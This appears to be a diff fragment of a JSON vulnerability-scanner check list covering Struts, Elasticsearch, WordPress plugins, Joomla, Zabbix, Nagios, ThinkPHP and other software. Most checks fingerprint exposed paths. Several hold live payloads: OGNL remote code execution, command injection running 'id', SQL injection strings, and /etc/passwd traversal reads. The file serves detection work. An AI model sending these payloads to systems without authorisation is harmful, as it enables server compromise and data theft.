+        "name": "Apache Struts 2 RCE (CVE-2017-5638)",
+        "category": "Framework",
+        "type": "RCE",
+        "check_type": "header",
+        "headers": {
+            "Content-Type": "%{(#_='=').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+        },
+        "indicator": "uid=",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Elasticsearch Unauth RCE (CVE-2014-3120)",
+        "category": "Infrastructure",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fpasswd%5C%22)).useDelimiter(%5C%22%5C%5CZ%5C%22).next()%3B%22%7D%7D%7D",
+        "indicator": "root:x:0:0",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Hadoop YARN RCE",
+        "category": "Infrastructure",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/ws/v1/cluster/apps/new-application",
+        "indicator": "application-id",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Kibana Prototype Pollution (CVE-2019-7609)",
+        "category": "Infrastructure",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/app/timelion",
+        "indicator": "timelion",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Docker Remote API Exposed",
+        "category": "Infrastructure",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/version",
+        "indicator": "ApiVersion",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Kubernetes API Exposed",
+        "category": "Infrastructure",
+        "type": "Info Disclosure",
+        "check_type": "path",
+        "path": "/api/v1",
+        "indicator": "APIResourceList",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "WordPress Elementor Authenticated RCE",
+        "category": "CMS",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/wp-content/plugins/elementor/changelog.txt",
+        "indicator": "Elementor",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "WordPress File Manager RCE (CVE-2020-25213)",
+        "category": "CMS",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php.dist",
+        "indicator": "elfinder",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Joomla Core SQLi (CVE-2015-7297)",
+        "category": "CMS",
+        "type": "SQLi",
+        "check_type": "path",
+        "path": "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select+1+from+(select+count(*),concat((select+version()),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)",
+        "indicator": "Duplicate entry",
+        "status": [
+            500
+        ]
+    },
+    {
+        "name": "OpenSpecimen LFI (CVE-2021-38290)",
+        "category": "Healthcare",
+        "type": "LFI",
+        "check_type": "path",
+        "path": "/openspecimen/rest/ng/files/download?filename=../../../../../../../../etc/passwd",
+        "indicator": "root:x:0:0",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Mirth Connect Deserialization (CVE-2023-43208)",
+        "category": "Healthcare",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/api/users",
+        "indicator": "Mirth",
+        "status": [
+            200,
+            401
+        ]
+    },
+    {
+        "name": "Zabbix SQLi (CVE-2016-10134)",
+        "category": "Monitoring",
+        "type": "SQLi",
+        "check_type": "path",
+        "path": "/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1+or+updatexml(1,md5(0x3a),1)+or+1=1)%23&updateProfile=true&period=3600&stime=20160817050638&resourcetype=17",
+        "indicator": "SQL syntax",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Nagios XI RCE (CVE-2019-15949)",
+        "category": "Monitoring",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/nagiosxi/admin/monitoringplugins.php",
+        "data": "plugin_file=test;id",
+        "indicator": "uid=",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Redis Exposed (HTTP)",
+        "category": "Database",
+        "type": "Info",
+        "check_type": "path",
+        "path": "/",
+        "indicator": "ERR wrong number of arguments",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "MongoDB Exposed (HTTP Interface)",
+        "category": "Database",
+        "type": "Info",
+        "check_type": "path",
+        "path": "/",
+        "indicator": "It looks like you are trying to access MongoDB over HTTP",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Java Melody Monitoring",
+        "category": "Java",
+        "type": "Info Disclosure",
+        "check_type": "path",
+        "path": "/monitoring",
+        "indicator": "JavaMelody",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Symfony Profiler Exposed",
+        "category": "Framework",
+        "type": "Info Disclosure",
+        "check_type": "path",
+        "path": "/_profiler/phpinfo",
+        "indicator": "PHP Version",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Ruby on Rails Local File Disclosure",
+        "category": "Framework",
+        "type": "LFI",
+        "check_type": "path",
+        "path": "/robots.txt%00.json",
+        "indicator": "ActiveRecord",
+        "status": [
+            200,
+            500
+        ]
+    },
+    {
+        "name": "ThinkPHP RCE (CVE-2018-1002015)",
+        "category": "Framework",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
+        "indicator": "uid=",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "ColdFusion LFI (CVE-2010-2861)",
+        "category": "Framework",
+        "type": "LFI",
+        "check_type": "path",
+        "path": "/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en",
+        "indicator": "root:x:0:0",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Tomcat Manager Exposed",
+        "category": "Server",
+        "type": "Info",
+        "check_type": "path",
+        "path": "/manager/html",
+        "indicator": "Tomcat Web Application Manager",
+        "status": [
+            401,
+            200
+        ]
+    },
+    {
+        "name": "JBoss JMX Console Exposed",
+        "category": "Server",
+        "type": "RCE/Info",
+        "check_type": "path",
+        "path": "/jmx-console/",
+        "indicator": "JBoss JMX Console",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "WebSphere Console Exposed",
+        "category": "Server",
+        "type": "Info",
+        "check_type": "path",
+        "path": "/ibm/console",
+        "indicator": "WebSphere",
+        "status": [
+            200,
+            302
+        ]
+    },
+    {
+        "name": "Solr Admin Exposed",
+        "category": "Search",
+        "type": "Info",
+        "check_type": "path",
+        "path": "/solr/admin/",
+        "indicator": "Solr Admin",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Elementor Fingerprint (Meta)",
+        "category": "Fingerprinting",
+        "type": "Info",
+        "check_type": "path",
+        "path": "/",
+        "indicator": "elementor-version",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Elementor Pro Detected",
+        "category": "CMS/Plugins",
+        "type": "Info",
+        "check_type": "path",
+        "path": "/wp-content/plugins/elementor-pro/",
+        "indicator": "Index of",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Elementor Text Path Widget XSS (CVE-2025-11220)",
+        "category": "CMS/Plugins",
+        "type": "XSS",
+        "check_type": "path",
+        "path": "/wp-content/plugins/elementor/assets/js/text-path.js",
+        "indicator": "textPath",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Elementor Global Style Validation (v3.35.2 Fix)",
+        "category": "CMS/Plugins",
+        "type": "Bypass/XSS",
+        "check_type": "path",
+        "path": "/wp-admin/admin-ajax.php?action=elementor_save_settings",
+        "indicator": "success:false",
+        "status": [
+            200,
+            400
+        ]
+    },
+    {
+        "name": "Elementor Repeater Info Leak (v3.31.3 Fix)",
+        "category": "CMS/Plugins",
+        "type": "Info Leak",
+        "check_type": "path",
+        "path": "/wp-content/plugins/elementor/assets/js/editor-v2.js",
+        "indicator": "repeater",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Elementor Shortcode Widget Attributes (v3.29.1 Fix)",
+        "category": "CMS/Plugins",
+        "type": "Bypass",
+        "check_type": "path",
+        "path": "/wp-content/plugins/elementor/assets/js/shortcode.js",
+        "indicator": "shortcode",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Apache Jetspeed RCE",
+        "category": "Infrastructure",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/jetspeed/portal",
+        "indicator": "Jetspeed",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Zyxel Firewall Auth Bypass (CVE-2020-29583)",
+        "category": "Firewall",
+        "type": "Auth Bypass",
+        "check_type": "path",
+        "path": "/cgi-bin/zld_login.cgi",
+        "indicator": "zyxel",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Adobe ColdFusion Deserialization (CVE-2019-7091)",
+        "category": "Framework",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/flex2gateway/amf",
+        "indicator": "amf",
+        "status": [
+            200,
+            404
+        ]
+    }
+]
